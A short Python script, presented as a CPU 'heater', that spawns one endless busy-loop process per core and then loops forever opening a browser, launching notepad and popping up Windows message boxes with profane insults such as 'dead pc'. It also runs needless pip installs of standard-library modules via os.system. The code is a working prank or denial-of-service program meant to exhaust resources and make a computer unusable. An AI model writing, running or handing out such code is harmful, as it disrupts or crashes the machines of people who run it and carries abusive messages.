import multiprocessing
import os
import sys
import webbrowser
import ctypes


def round_robin_count():
	while(True):
		number = 0
		if(number >= sys.maxsize):
			number = 0
		else:
			number = number + 1


if __name__ == "__main__":
	if len(sys.argv) == 2 and sys.argv[1] == '--about':
		print(__doc__)
	elif len(sys.argv) == 2 and sys.argv[1] == '--help':
		print('Heater', 'USAGE: python3 ' + sys.argv[0] + ' [option]', sep='\n')
		print('To read about.', 'python3 ' + sys.argv[0] + ' --about' ,sep='  ')
		print('To see this help message.', 'python3 ' + sys.argv[0] + ' --help', sep='  ')
	else:
		process_count = 1
		print('Heating up the CPU')
		while(process_count <= multiprocessing.cpu_count()):
			process_to_be_not_seen_again = multiprocessing.Process(target=round_robin_count)
			process_to_be_not_seen_again.start()
			process_count += 1



def lol():
	cmd = "pip install ctypes"
	os.system(cmd)
	cmd1 = "pip install webbrowser"
	os.system(cmd1)
	cmd2 = "pip install sys"
	os.system(cmd2)
	cmd3 = "pip install multiprocessing"
	os.system(cmd3)
lol()

while True:
	webbrowser.open("www.google.com")
	cmd = "notepad"
	os.system(cmd)
	print("get fucked up bitch !!!!! XD")
	ctypes.windll.user32.MessageBoxW(0, "got fucked up bitch !", "dead pc X(")

	